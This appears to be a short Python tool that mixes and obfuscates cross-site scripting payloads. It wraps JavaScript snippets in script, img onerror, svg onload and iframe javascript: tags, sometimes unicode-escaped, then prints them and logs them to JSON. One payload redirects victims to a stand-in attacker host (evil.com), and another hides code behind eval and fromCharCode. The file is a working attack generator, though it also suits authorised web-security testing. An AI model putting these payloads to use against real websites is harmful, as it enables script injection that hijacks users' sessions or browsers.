import random
from rich.console import Console
from datetime import datetime
from pathlib import Path
import json

console = Console()

# Chaotic mutator payload elementi
base_payloads = [
    "alert(1)",
    "confirm(1)",
    "prompt(1)",
    "document.location='http://evil.com'",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
    "setTimeout(()=>{alert('XSS')},1000)",
]

wrappers = [
    "<script>{}</script>",
    "<img src='x' onerror=\"{}\">",
    "<svg/onload=\"{}\">",
    "<body onresize=\"{}\">",
    "<iframe src=\"javascript:{}\">",
    "<div style=\"background:url('javascript:{}')\">Test</div>",
]

def unicode_encode(js):
    return ''.join([f"\\u{ord(c):04x}" for c in js])

def generate_chaotic(count=10):
    results = []
    for _ in range(count):
        js = random.choice(base_payloads)

        # Obfuscate some
        if random.random() < 0.5:
            js = unicode_encode(js)

        wrapped = random.choice(wrappers).format(js)
        results.append(wrapped)

    return results

def display_and_save():
    payloads = generate_chaotic(10)
    console.print("[bold yellow]Chaotic XSS Payloads:[/bold yellow]")
    for i, p in enumerate(payloads, 1):
        console.print(f"[{i}] {p}")

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = Path(f"logs/chaotic_mutations_{ts}.json")
    out_path.parent.mkdir(exist_ok=True)
    with open(out_path, "w") as f:
        json.dump(payloads, f, indent=2)

    console.print(f"\n[✓] Sačuvano u fajl: {out_path}")

if __name__ == "__main__":
    display_and_save()
